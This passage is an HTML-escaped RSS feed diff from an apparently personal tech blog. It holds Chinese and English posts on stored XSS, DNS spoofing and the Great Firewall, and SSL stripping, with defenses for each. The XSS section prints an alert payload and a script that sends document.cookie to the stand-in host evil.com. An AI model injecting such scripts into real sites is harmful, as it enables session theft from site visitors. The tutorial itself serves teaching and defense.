+&lt;li&gt;对用户输入进行严格的&lt;strong&gt;输入验证&lt;/strong&gt;和&lt;strong&gt;输出编码&lt;/strong&gt;（例如，将 &lt;code&gt;&amp;lt;&lt;/code&gt; 编码为 &lt;code&gt;&amp;amp;lt;&lt;/code&gt;）&lt;/li&gt;
+&lt;li&gt;使用安全的框架（如 React 或 Angular），它们通常会自动对输出进行转义&lt;/li&gt;
+&lt;li&gt;启用 Content Security Policy (CSP)，限制页面加载的脚本来源&lt;/li&gt;
+&lt;li&gt;对 URL 参数进行过滤，拒绝包含可疑字符的请求&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;12-存储型-xss-stored-xss&#34;&gt;1.2. 存储型 XSS (Stored XSS)&lt;/h3&gt;
+&lt;p&gt;存储型 XSS 是一种持久性跨站脚本攻击, 攻击者将恶意脚本注入到目标网站的数据库或其他存储介质中, 当其他用户访问受感染的页面时, 服务器会从存储中取出恶意脚本并将其嵌入到页面, 脚本会在用户的浏览器中执行:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;攻击者通过网站的输入点（如评论区、用户资料、帖子等）提交包含恶意脚本的内容&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;服务器未对输入进行充分过滤，将恶意脚本保存到数据库&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;当其他用户访问相关页面时，服务器从数据库中取出数据（包含恶意脚本），并将其嵌入到页面中&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;用户的浏览器加载页面时，执行恶意脚本&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;假设有一个论坛网站, 用户可以在帖子中发表评论, 如果服务器没有对评论内容进行过滤, 攻击者可以在评论中输入恶意脚本, 例如, 攻击者在评论框中输入:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;You are hacked!&amp;#39;);&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这条评论被保存到数据库中, 每当其他用户访问这个帖子时, 服务器会从数据库中取出评论内容并直接渲染到页面, 生成如下 HTML:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;comment&amp;#34;&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;You are hacked!&amp;#39;&lt;/span&gt;);&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;所有访问该帖子的用户都会在浏览器中看到 You are hacked! 的弹窗, 攻击者可能利用存储型 XSS 进行更严重的攻击, 例如窃取用户会话或执行钓鱼攻击, 假设攻击者在评论中输入:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;XMLHttpRequest&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://evil.com/steal?cookie=&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;cookie&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/script&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这条评论被存储后, 任何访问该页面的用户的 Cookie 都会被发送到攻击者的服务器 evil.com, 如果网站使用 Cookie 进行身份验证, 攻击者可能窃取用户的会话, 冒充用户进行操作,&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;防御措施&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;使用 HTTPOnly 和 Secure Cookie 标志, 降低 Cookie 窃取的风险&lt;/li&gt;
+&lt;li&gt;启用 Content Security Policy (CSP), 限制脚本执行&lt;/li&gt;
+&lt;li&gt;对用户输入进行严格的&lt;strong&gt;输入验证&lt;/strong&gt;, 只允许安全的字符和格式&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>DNS Spoofing - GFW</title>
+      <link>https://blog.jiyi27.com/posts/networking/005-gfw-dns/</link>
+      <pubDate>Tue, 31 Oct 2023 15:29:25 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/networking/005-gfw-dns/</guid>
+      <description>&lt;p&gt;声明: 本文只用于学习目的, 请勿用于非法用途.&lt;/p&gt;
+&lt;h2 id=&#34;1-dns-spoofing&#34;&gt;1. DNS spoofing&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.cloudflare.com/learning/dns/what-is-dns/&#34;&gt;DNS&lt;/a&gt; cache poisoning is the act of entering false information into a DNS cache, so that DNS queries return an incorrect response and users are directed to the wrong websites. DNS cache poisoning is also known as &amp;lsquo;DNS spoofing&amp;rsquo;.&lt;/p&gt;
+&lt;h3 id=&#34;11-dns-caching&#34;&gt;1.1. DNS Caching&lt;/h3&gt;
+&lt;p&gt;Learn more about DNS caching: &lt;a href=&#34;https://davidzhu.xyz/post/networking/002-dns-basics/&#34;&gt;DNS Concepts (NameServer(NS), DNS Records and Caching) - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;12-how-do-attackers-poison-dns-caches&#34;&gt;1.2. How do attackers poison DNS caches?&lt;/h3&gt;
+&lt;p&gt;Attackers can poison DNS caches by impersonating &lt;a href=&#34;https://www.cloudflare.com/learning/dns/dns-server-types/&#34;&gt;DNS nameservers&lt;/a&gt;, making a request to a DNS resolver, and then forging the reply when the DNS resolver queries a nameserver. This is possible because DNS servers use &lt;a href=&#34;https://www.cloudflare.com/learning/ddos/glossary/user-datagram-protocol-udp/&#34;&gt;UDP&lt;/a&gt; instead of &lt;a href=&#34;https://www.cloudflare.com/learning/ddos/glossary/tcp-ip/&#34;&gt;TCP&lt;/a&gt;, and because currently there is no verification for DNS information.&lt;/p&gt;</description>
+      <content>&lt;p&gt;声明: 本文只用于学习目的, 请勿用于非法用途.&lt;/p&gt;
+&lt;h2 id=&#34;1-dns-spoofing&#34;&gt;1. DNS spoofing&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.cloudflare.com/learning/dns/what-is-dns/&#34;&gt;DNS&lt;/a&gt; cache poisoning is the act of entering false information into a DNS cache, so that DNS queries return an incorrect response and users are directed to the wrong websites. DNS cache poisoning is also known as &amp;lsquo;DNS spoofing&amp;rsquo;.&lt;/p&gt;
+&lt;h3 id=&#34;11-dns-caching&#34;&gt;1.1. DNS Caching&lt;/h3&gt;
+&lt;p&gt;Learn more about DNS caching: &lt;a href=&#34;https://davidzhu.xyz/post/networking/002-dns-basics/&#34;&gt;DNS Concepts (NameServer(NS), DNS Records and Caching) - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;12-how-do-attackers-poison-dns-caches&#34;&gt;1.2. How do attackers poison DNS caches?&lt;/h3&gt;
+&lt;p&gt;Attackers can poison DNS caches by impersonating &lt;a href=&#34;https://www.cloudflare.com/learning/dns/dns-server-types/&#34;&gt;DNS nameservers&lt;/a&gt;, making a request to a DNS resolver, and then forging the reply when the DNS resolver queries a nameserver. This is possible because DNS servers use &lt;a href=&#34;https://www.cloudflare.com/learning/ddos/glossary/user-datagram-protocol-udp/&#34;&gt;UDP&lt;/a&gt; instead of &lt;a href=&#34;https://www.cloudflare.com/learning/ddos/glossary/tcp-ip/&#34;&gt;TCP&lt;/a&gt;, and because currently there is no verification for DNS information.&lt;/p&gt;
+&lt;p&gt;DNS Cache Poisoning Process:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-2a6758f3b2d64ef5bb71ba1601101d35.r2.dev/blogs/2025/01/9bac53ae4cf010ddec6d34a15ca5bf7a.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Poisoned DNS Cache:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-2a6758f3b2d64ef5bb71ba1601101d35.r2.dev/blogs/2025/01/5160e98a37841a2eac514a21f56224c9.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;If a DNS resolver receives a forged response, it accepts and caches the data uncritically because there is no way to verify if the information is accurate and comes from a legitimate source.&lt;/p&gt;
+&lt;p&gt;Despite these major points of vulnerability in the DNS caching process, DNS poisoning attacks are not easy. Because the DNS resolver does actually query the authoritative nameserver, attackers have only a few milliseconds to send the fake reply before the real reply from the authoritative nameserver arrives.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The way to prevent this is to set the /etc/host file directly, because checking host file happens before DNS resolution.&lt;/p&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://davidzhu.xyz/post/networking/002-host-file-dns-stub-resolver/&#34;&gt;DNS Stub and Recursive Resolver - Config Files - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://www.cloudflare.com/learning/dns/dns-cache-poisoning/&#34;&gt;What is DNS cache poisoning? | DNS spoofing | Cloudflare&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2-gfw&#34;&gt;2. GFW&lt;/h2&gt;
+&lt;h3 id=&#34;21-http-劫持&#34;&gt;2.1. HTTP 劫持&lt;/h3&gt;
+&lt;p&gt;原文: &lt;a href=&#34;https://doubibackup.com/6t3mypbm-5.html#comments&#34;&gt;浅谈HTTP劫持、DNS污染的影响及解决办法（仅个人理解） | 逗比根据地&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;HTTP劫持很容易理解，因为HTTP传输协议是明文的，并且我的网站服务器是在海外，要访问我的网站就要通过中国的国际宽带出口，出去与我的网站建立连接。我的网站也是因为关键词的原因在经过出口的时候，被“&lt;strong&gt;检查站：墙&lt;/strong&gt;”扫描到了违规关键词，于是掐断了TCP链接。所以当时用户访问网站会遇到：&lt;strong&gt;链接已重置、该网站已永久移动到其他地址等等。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;HTTP劫持很容易解决，那就是&lt;strong&gt;加上SSL证书，网站链接全部内容加密&lt;/strong&gt;，这样“检查站：墙”就无法解密数据分析关键词了。但是这不是绝对能解决这个问题的，如果你的网站只是误杀或者违规擦边球，那还好，如果是大型网站，就会特殊对待了。&lt;/p&gt;
+&lt;p&gt;HTTPS在建立加密连接的时候，需要一次握手，也就是达成链接协议建立加密连接，但是这次握手是明文的（建立加密链接首先就是链接双方信任，比如网站的SSL证书是自己签的，或者SSL证书到期或伪造的，在访问这个网站的时候浏览器就会进行提示，表示此网站不安全啥的。）握手是明文的就意味着，如果你的域名被重点关注，即使你加上了SSL证书，也会在首次握手的时候，被关键词匹配然后掐断链接。 learn more: &lt;a href=&#34;https://davidzhu.xyz/post/http/006-https-ssl/&#34;&gt;HTTPS SSL TLS - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;22-dns污染投毒&#34;&gt;2.2. DNS污染投毒&lt;/h3&gt;
+&lt;p&gt;我们假设A为用户端也就是你的电脑设备，B为DNS服务器，C为A到B链路中一个节点的网络设备（路由器、交换机、网关等）。&lt;/p&gt;
+&lt;p&gt;然后我们模拟一次被污染的DNS请求过程。&lt;/p&gt;
+&lt;p&gt;A访问一个网站，比如 &lt;code&gt;google.com&lt;/code&gt; ，然后，A向B通过UDP方式发送查询请求，比如查询内容 &lt;code&gt;A google.com&lt;/code&gt; ，这个数据库在前往B的时候要经过数个节点网络设备比如C，然后继续前往DNS服务器B。&lt;/p&gt;
+&lt;p&gt;然而在这个传输过程中，C针对这个数据包进行特征分析，（DNS端口为53，进行特定端口监视扫描，对UDP明文传输的DNS查询请求进行特征和关键词匹配分析，比如“google.com”是关键词，也或者是“A记录”），从而立刻返回一个错误的解析结果（比如返回了 &lt;code&gt;A 233.233.233.233&lt;/code&gt; ）。&lt;/p&gt;
+&lt;p&gt;众所周知，作为链路上的一个节点，网络设备 C 必定比真正的 DNS 服务器 B 更快的返回结果到 用户电脑A，而目前的DNS解析机制策略有一个重要的原则，就是只认第一。因此 节点网络设备C所返回的查询结果就被 用户电脑A当作了最终结果，于是用户电脑A因为获得了错误的IP，导致无法正常访问 &lt;code&gt;google.com &lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;验证污染 我的 doub.ssrshare.usm 主域名虽然在大部分地区解除了DNS污染，但是我的两个SS站域名并没有，所以我尝试对我的SS 子域名进行nslookup测试。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator&amp;gt;nslookup ss.dou-bi.com 8.8.8.8
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;服务器: google-public-dns-a.google.com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Address: 8.8.8.8
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;非权威应答:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;名称: ss.dou-bi.com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Addresses: 200:2:9f6a:794b::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;8.7.198.45
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我使用的是谷歌的 8.8.8.8 DNS，但是我得到的A记录 IP却是8.7.198.45，这个明显不是我的IP，看一下其他被DNS污染的域名就会发现都会有这个IP。很明显，我的 ss.dou-bi.com 域名受到了DNS污染。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;解决办法&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;使用加密代理&lt;/strong&gt;，比如Shadowsocks，在加密代理里进行远程DNS解析，或者使用VPN上网。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;修改hosts文件&lt;/strong&gt;，操作系统中Hosts文件的权限优先级高于DNS服务器，操作系统在访问某个域名时，会先检测HOSTS文件，然后再查询DNS服务器。可以在hosts添加受到污染的DNS地址来解决DNS污染和DNS劫持。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;通过一些软件编程处理&lt;/strong&gt;，可以直接忽略返回结果是虚假IP地址的数据包，直接解决DNS污染的问题。如果你是Firefox用户，并且只用Firefox，又懒得折腾，直接打开Firefox的远程DNS解析就行了。在地址栏中输入：&lt;code&gt;about:config&lt;/code&gt;找到 &lt;code&gt;network.proxy.socks_remote_dns&lt;/code&gt; 一项改成true。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;使用DNSCrypt软件&lt;/strong&gt;，此软件与使用的OpenDNS直接建立相对安全的TCP连接并加密请求数据，从而不会被污染。 对于被DNS污染的网站站长来说，最有效的方法就是 换域名或者IP 了。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;23-ip黑名单&#34;&gt;2.3. ip黑名单&lt;/h3&gt;
+&lt;p&gt;即使没有DNS污染 或者 你获得了正确的IP，你就能正常访问这些被屏蔽的网站了吗？&lt;/p&gt;
+&lt;p&gt;不，墙目前已经有了IP黑名单，针对谷歌这种网站已经不再是普通的DNS污染了，因为总会有办法访问被DNS污染的网站（比如指定Hosts）。&lt;/p&gt;
+&lt;p&gt;那么就直接把所有的谷歌IP拉黑不就好了？就算你获得了正确的谷歌IP，但是当你去访问这个IP的时候，墙会发现这个IP存在于黑名单中，于是直接阻断，于是浏览器就会提示：www.google.com 的响应时间过长等等&lt;/p&gt;
+&lt;h2 id=&#34;3-常见代理方式&#34;&gt;3. 常见代理方式&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;VPN
+&lt;ul&gt;
+&lt;li&gt;常见协议: IPSec, OpenVPN, L2TP, WireGuard&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Shadowsocks (代理服务器)
+&lt;ul&gt;
+&lt;li&gt;常见协议: SOCKS5&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;V2Ray (代理服务器)
+&lt;ul&gt;
+&lt;li&gt;常见协议: VMess&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;HTTP 代理 (代理服务器)
+&lt;ul&gt;
+&lt;li&gt;已被封锁, 原因是HTTP代理并不对数据进行加密, 即使流量能够绕过初步的审查，传输的内容仍然是透明的，容易被监控。&lt;/li&gt;
+&lt;li&gt;即使使用 HTTPS 也不会实现全局加密, 在建立 TLS 握手验证时还是需要一个HTTP明文连接&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;了解更多: &lt;a href=&#34;https://superxlcr.github.io/2018/07/01/%E4%B8%8A%E7%BD%91%E9%99%90%E5%88%B6%E5%92%8C%E7%BF%BB%E5%A2%99%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/&#34;&gt;上网限制和翻墙基本原理 | superxlcr&amp;rsquo;s notebook&lt;/a&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Common Network Attacks</title>
+      <link>https://blog.jiyi27.com/posts/networking/010-common-attacks/</link>
+      <pubDate>Mon, 30 Oct 2023 22:44:57 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/networking/010-common-attacks/</guid>
+      <description>&lt;h2 id=&#34;1-man-in-the-middle-attack&#34;&gt;1. Man-in-the-middle attack&lt;/h2&gt;
+&lt;p&gt;Learn more:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://davidzhu.xyz/post/cs-basics/002-ssh/&#34;&gt;https://davidzhu.xyz/post/cs-basics/002-ssh/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://davidzhu.xyz/post/cs-basics/003-ssl-secure-communication/#4-details-in-tls-handshake---avoid-man-in-middle-attack&#34;&gt;HTTPS SSL TLS - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2-ddos-attack&#34;&gt;2. DDoS attack&lt;/h2&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://davidzhu.xyz/post/networking/004-ddos-attack/&#34;&gt;DDoS Attack - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;3-csrf-attack&#34;&gt;3. CSRF attack&lt;/h2&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://davidzhu.xyz/post/http/007-csrf-attack/&#34;&gt;CSRF Attack and CORS - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;4-ssl-stripping&#34;&gt;4. SSL stripping&lt;/h2&gt;
+&lt;p&gt;SSL stripping attacks, also known as SSL strip, SSL downgrade, or HTTP downgrade attacks, strip the encryption offered by HTTPS, reducing the connection to the less-secure HTTP.&lt;/p&gt;
+&lt;p&gt;In order to &lt;a href=&#34;https://avicoder.me/2016/02/22/SSLstrip-for-newbies/&#34;&gt;“strip” the SSL&lt;/a&gt;, an attacker intervenes in the redirection of the HTTP to the secure HTTPS protocol and intercepts a request from the user to the server. The attacker will then continue to establish an HTTPS connection between himself and the server, and an unsecured HTTP connection with the user, acting as a “bridge” between them.&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;1-man-in-the-middle-attack&#34;&gt;1. Man-in-the-middle attack&lt;/h2&gt;
+&lt;p&gt;Learn more:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://davidzhu.xyz/post/cs-basics/002-ssh/&#34;&gt;https://davidzhu.xyz/post/cs-basics/002-ssh/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://davidzhu.xyz/post/cs-basics/003-ssl-secure-communication/#4-details-in-tls-handshake---avoid-man-in-middle-attack&#34;&gt;HTTPS SSL TLS - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2-ddos-attack&#34;&gt;2. DDoS attack&lt;/h2&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://davidzhu.xyz/post/networking/004-ddos-attack/&#34;&gt;DDoS Attack - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;3-csrf-attack&#34;&gt;3. CSRF attack&lt;/h2&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://davidzhu.xyz/post/http/007-csrf-attack/&#34;&gt;CSRF Attack and CORS - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;4-ssl-stripping&#34;&gt;4. SSL stripping&lt;/h2&gt;
+&lt;p&gt;SSL stripping attacks, also known as SSL strip, SSL downgrade, or HTTP downgrade attacks, strip the encryption offered by HTTPS, reducing the connection to the less-secure HTTP.&lt;/p&gt;
+&lt;p&gt;In order to &lt;a href=&#34;https://avicoder.me/2016/02/22/SSLstrip-for-newbies/&#34;&gt;“strip” the SSL&lt;/a&gt;, an attacker intervenes in the redirection of the HTTP to the secure HTTPS protocol and intercepts a request from the user to the server. The attacker will then continue to establish an HTTPS connection between himself and the server, and an unsecured HTTP connection with the user, acting as a “bridge” between them.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-2a6758f3b2d64ef5bb71ba1601101d35.r2.dev/blogs/2025/01/b0158611a93323eae52c342681549a60.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;How can the SSL strip trick both the browser and the website’s server? The SSL strip takes advantage of the way most users come to SSL websites. The majority of visitors connect to a website’s page that redirects through a 302 redirect, or they arrive on an SSL page via a link from a non-SSL site. If the victim wants, for instance, to buy a product and types the URL &lt;a href=&#34;https://www.buyme.com&#34;&gt;www.buyme.com&lt;/a&gt; in the address bar, the browser connects to the attacker&amp;rsquo;s machine and waits for a response from the server. In an SSL strip, the attacker, in turn, forwards the victim’s request to the online shop’s server and receives the secure HTTPS payment page. For example &lt;a href=&#34;https://www.buyme.com&#34;&gt;https://www.buyme.com&lt;/a&gt;. At this point, the attacker has complete control over the secure payment page. He downgrades it from HTTPS to HTTP and sends it back to the victim’s browser. The browser is now redirected to &lt;a href=&#34;http://www.buyme.com&#34;&gt;http://www.buyme.com&lt;/a&gt;. From now onward, all the victim’s data will be transferred in plain text format, and the attacker will be able to intercept it. Meanwhile, the website’s server will think that it has successfully established the secure connection, which indeed it has—but with the attacker’s machine, not the victim’s.&lt;/p&gt;
+&lt;h3 id=&#34;41-enable-ssl-sitewide-at-all-websites&#34;&gt;4.1. Enable SSL sitewide at all websites&lt;/h3&gt;
+&lt;p&gt;To mitigate this threat, financial institutions and technology firms have &lt;a href=&#34;https://venafi.com/blog/https-should-be-implemented-everywhereincluding-static-websites/&#34;&gt;already enabled&lt;/a&gt; HTTPS on a site-wide basis. Enabling HTTPS encrypts the connection between a browser and the website, thereby securing sensitive data transmissions. Therefore it makes perfect sense for banks and high-profile technology firms to enable HTTPS on their dynamic websites because of the transaction of important and sensitive information.&lt;/p&gt;
+&lt;h3 id=&#34;42-why-enable-hsts&#34;&gt;4.2. Why enable HSTS?&lt;/h3&gt;
+&lt;p&gt;In addition to enabling HTTPS on a site-wide basis, corporations should weigh the benefits of enabling &lt;a href=&#34;https://www.globalsign.com/en/blog/what-is-hsts-and-how-do-i-use-it/&#34;&gt;HSTS&lt;/a&gt; (HTTP Strict Transport Security), which is a web security policy mechanism that helps to protect websites against SSL stripping attacks and cookie hijacking. &lt;strong&gt;It allows&lt;/strong&gt; &lt;strong&gt;web servers to declare that&lt;/strong&gt; web browsers should interact with them using only secure HTTPS connections, and never via the insecure HTTP protocol.&lt;/p&gt;
+&lt;p&gt;When a web application issues HSTS Policy to user browsers, conformant user browsers will &lt;a href=&#34;https://www.owasp.org/index.php/HTTP_Strict_Transport_Security_Cheat_Sheet&#34;&gt;automatically redirect&lt;/a&gt; any insecure HTTP requests to HTTPS for the target website. In addition, when a man-in-the-middle attacker attempts to intercept traffic from a victim using an invalid certificate, HSTS does not allow the user to override the invalid certificate warning message. By having a HSTS policy installed, it will be nearly impossible for the attackers to intercept any information at all!&lt;/p&gt;
+&lt;p&gt;Source: &lt;a href=&#34;https://venafi.com/blog/what-are-ssl-stripping-attacks/&#34;&gt;What Are SSL Stripping Attacks? | Venafi&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;5-dns&#34;&gt;5. DNS&lt;/h2&gt;
+&lt;h3 id=&#34;51-dns-hijacking&#34;&gt;5.1. DNS hijacking&lt;/h3&gt;
+&lt;p&gt;To prevent DNS hijacking, first, you have to know the different kinds of attacks. DNS hijacking can take four different forms:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Local DNS hijacking:&lt;/strong&gt; An attacker installs &lt;a href=&#34;https://www.fortinet.com/resources/cyberglossary/trojan-horse-virus&#34;&gt;Trojan software&lt;/a&gt; on a user&amp;rsquo;s computer, then modifies the local DNS settings (cahnge its DNS server to a Rogue DNS server).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;DNS hijacking using a router:&lt;/strong&gt; Many routers have weak firmware or use the default passwords they were shipped with. Attackers can take advantage of this to hack a router and change its DNS settings, which will affect everyone that uses that router.&lt;/li&gt;
